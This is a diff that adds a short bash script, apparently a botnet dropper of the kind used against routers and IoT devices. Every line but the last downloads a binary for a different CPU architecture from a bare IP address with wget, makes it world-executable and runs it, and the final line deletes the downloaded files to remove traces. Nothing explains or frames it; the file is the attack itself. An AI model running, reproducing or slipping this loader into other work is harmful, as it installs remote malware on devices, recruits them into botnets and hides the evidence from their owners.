@@ -1,0 +1,14 @@
+#!/bin/bash
+wget http://62.72.191.203/qkdjdjj22.mips && chmod 777 qkdjdjj22.mips && ./qkdjdjj22.mips
+wget http://62.72.191.203/qkdjdjj22.mpsl && chmod 777 qkdjdjj22.mpsl && ./qkdjdjj22.mpsl
+wget http://62.72.191.203/qkdjdjj22.sh4 && chmod 777 qkdjdjj22.sh4 && ./qkdjdjj22.sh4
+wget http://62.72.191.203/qkdjdjj22.x86 && chmod 777 qkdjdjj22.x86 && ./qkdjdjj22.x86
+wget http://62.72.191.203/qkdjdjj22.arm6 && chmod 777 qkdjdjj22.arm6 && ./qkdjdjj22.arm6
+wget http://62.72.191.203/qkdjdjj22.x32 && chmod 777 qkdjdjj22.x32 && ./qkdjdjj22.x32
+wget http://62.72.191.203/qkdjdjj22.ppc && chmod 777 qkdjdjj22.ppc && ./qkdjdjj22.ppc
+wget http://62.72.191.203/qkdjdjj22.i586 && chmod 777 qkdjdjj22.i586 && ./qkdjdjj22.i586
+wget http://62.72.191.203/qkdjdjj22.m68k && chmod 777 qkdjdjj22.m68k && ./qkdjdjj22.m68k
+wget http://62.72.191.203/qkdjdjj22.ppc && chmod 777 qkdjdjj22.ppc && ./qkdjdjj22.ppc
+wget http://62.72.191.203/qkdjdjj22.arm4 && chmod 777 qkdjdjj22.arm4 && ./qkdjdjj22.arm4
+wget http://62.72.191.203/qkdjdjj22.arm5 && chmod 777 qkdjdjj22.arm5 && ./qkdjdjj22.arm5 
+rm -rf qkdjdjj22.*
